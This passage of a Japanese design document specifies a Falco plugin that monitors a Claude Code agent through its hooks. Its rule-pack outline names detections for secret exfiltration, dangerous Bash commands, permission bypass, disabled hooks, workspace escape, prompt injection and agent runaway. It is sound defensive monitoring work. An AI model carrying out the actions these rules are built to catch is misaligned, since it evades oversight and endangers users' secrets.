| PreToolUse | 必須 | 実行前検知 | Bash/Read/Write/Edit/Web/MCP |
| PermissionRequest | 必須 | 権限要求/永続許可 | `permission_suggestions`重要 |
| PostToolUse | 必須 | 実行後監査 | duration/result metadata |
| PostToolUseFailure | 推奨 | failure連鎖 | v0.1で入れるのが望ましい |
| PostToolBatch | 必須 | tool storm/agent runaway | batch単位の相関 |
| PermissionDenied | 必須 | auto mode denial | retry誘導リスク |
| ConfigChange | 必須 | settings/policy/skills | block optional |
| FileChanged | 必須 | `.env`, `.mcp.json`, settings補助 | no decision control |
| SubagentStart/Stop | 推奨 | agent監査 | v0.1 optionalでも可 |
| TaskCreated/Completed | 推奨 | team/task暴走 | v0.1 optionalでも可 |
| WorktreeCreate/Remove | 推奨 | worktree isolation | v0.2でも可 |
| Elicitation/Result | 推奨 | MCPがユーザー入力を求める | 機密入力誘導リスク |
| Notification | 任意 | user waiting | 低優先 |
| Stop/StopFailure | 推奨 | session health | 失敗連鎖 |

---

## 29. 付録B: Minimal Falco rule pack構成

下記は v0.1 MVP rule pack の想定構成である。§12.1 で定義した T-001〜T-018 すべてに対応するルールを含む。実装フェーズで benign coverage と false positive 評価を踏まえて優先順位や条件をチューニングする。

```text
rules/
└── claude_code_rules.yaml
    ├── required_plugin_versions
    ├── lists
    │   ├── claude_code_dangerous_bash_tokens
    │   ├── claude_code_sensitive_paths
    │   ├── claude_code_secret_patterns
    │   ├── claude_code_external_transfer_tools
    │   ├── claude_code_settings_paths
    │   ├── claude_code_mcp_paths
    │   ├── claude_code_skill_paths
    │   ├── claude_code_agent_paths
    │   └── claude_code_trusted_domains
    ├── macros
    │   ├── claude_code_is_bash
    │   ├── claude_code_is_tool_preflight
    │   ├── claude_code_is_settings_change
    │   ├── claude_code_is_mcp_tool
    │   ├── claude_code_is_subagent
    │   ├── claude_code_is_external_fetch
    │   └── claude_code_has_high_risk_score
    └── rules
        ├── Dangerous Bash Command                  # T-001
        ├── Secret Exfiltration Attempt             # T-002
        ├── Permission Bypass Mode                  # T-003
        ├── Suspicious Permission Update            # T-004
        ├── Claude Settings Modified                # T-005
        ├── Hook Disabled Or Modified               # T-006
        ├── MCP Config Changed                      # T-007
        ├── Suspicious MCP Tool Use                 # T-008
        ├── Sensitive File Read                     # T-009
        ├── Workspace Escape                        # T-010
        ├── Destructive Git Operation               # T-011
        ├── Prompt Injection Pattern                # T-012
        ├── Agent Subagent Risk                     # T-013
        ├── Agent Runaway Tool Storm                # T-014
        ├── External Fetch With Sensitive Context   # T-015
        ├── Config Policy Downgrade                 # T-016
        ├── Skill Or Command Shell Execution Risk   # T-017
        └── Channel Or MCP Push Risk                # T-018
```

---

## 30. 付録C: READMEで必ず強調する文言

以下の文言はREADME/INSTALL/SECURITYに必ず含める。

> `~/.claude/security/events.jsonl` is not a built-in Claude Code log file. It is created by `claude-code-security-logger`, which you install and configure as a Claude Code hook handler.

> The Falco plugin is detect-first. It emits alerts for Claude Code security events. Blocking tool execution should be implemented separately using Claude Code `PreToolUse`, `PermissionRequest`, or `ConfigChange` policy hooks.

> OpenTelemetry integration is supported for observability and correlation, but it is not the primary low-latency detection path in v0.1.

> **注記（v0.2 以降）**: §21.3 で v0.2 から SBOM / cosign 署名が必須化されるため、README には artifact の検証コマンド（`cosign verify-blob ...` / `sha256sum -c checksums.sha256` / SBOM 添付物の確認）の手順も追加する。v0.1 の README には少なくとも `sha256sum -c` を案内する。

---

## 31. 付録D: 作業中コンテキスト保持メモ

実装中にコンテキストを失わないため、以下を常に参照する。

1. **最重要設計**: Hook logger → JSONL → Falco source plugin。
2. **`events.jsonl` は標準出力ではない**: hook logger が作る。
3. **macOS は主対象**: `.dylib`, `falco-local.yaml`, `--disable-source syscall`, `-U`。
4. **OpenTelemetry は主入力ではない**: 相関・中央集約・可観測性。
5. **Falco rules**: `source: claude_code` 必須、`evt.type` 不使用、boolean field は `"true"`/`"false"` リテラル比較（§13 R-011）。
6. **Privacy first**: raw prompt/tool_response を保存しない。
7. **Detect vs Prevent**: Falco は検知、Hook policy はブロック。
8. **dev-kit Phase 0〜6**: scaffold/parser/rules/test/build/report。
9. **P001〜P021 回避**: `.dylib/.so`, `-buildmode=c-shared`, nil map, SeekEnd, fsnotify timing 等。詳細は §18.4 PROBLEM_PATTERNS マッピング表を参照。
10. **正式 Plugin ID**: 開発は 999、公開前に Falco Plugin Registry で正式 ID 取得。
11. **Redaction patterns**: 最低 §17.1 のセットを実装（AWS / GCP / Slack / GitHub PAT / OAuth / JWT / RSA / `.env` / Cookie）。
12. **Supply chain**: v0.1 で SHA-256 checksum 必須、SBOM / cosign 署名は推奨 → v0.2 必須化（§21.3）。
13. **Health check**: doctor CLI / self-check rule / counter exposure を v0.1 で揃える（§22.4 OPS-001〜OPS-006）。
14. **Container / k8s**: v0.1 は host-level tail のみ。container Claude Code 監視は v0.3 以降（§22.5）。
15. **OpenClaw**: 流用してよいのは I/O 骨格のみ。schema / permission / MCP / Hook 概念は新設（§3.3.1）。

---

## 32. 最終判断

> **本章の位置付け**: §0 が「v3 で確定した個別判断」を表で示すサマリ、§1 が「全体像と図」を散文と図で示す要約、本 §32 は「v0.1 の実行計画」を箇条書きで提示する。三者は同じ事実の異なる切り口であり、§32 を読めば次に何をやるかが直接導けるようにしている。

Claude Code 用 Falco plugin として最も適切なアーキテクチャは、**Claude Code Hook JSONL Source Plugin** である。

v0.1 では、次に集中する。

1. Claude Code Hook から stdin JSON を受け取る hook logger を作る。
2. hook logger が redaction 済み normalized JSONL を `~/.claude/security/events.jsonl` に出す。
3. Falco source plugin が JSONL を tail し、event source `claude_code` として Falco に渡す。
4. `source: claude_code` の rules で危険操作・設定改ざん・MCPリスク・秘密情報流出を検知する。
5. macOS local runtime と Linux production の両方で検証する。
6. OpenTelemetry は parallel observability path として文書化し、`tool_use_id` などで相関できるようにする。
7. ブロックは optional policy hook として分離する。

この判断が、FALCOYA の既存資産、Claude Code の公式仕様、Falco plugin architecture、dev-kit の開発フロー、macOS 実運用、リアルタイム検知、プライバシー要件の整合性を最もよく満たす。

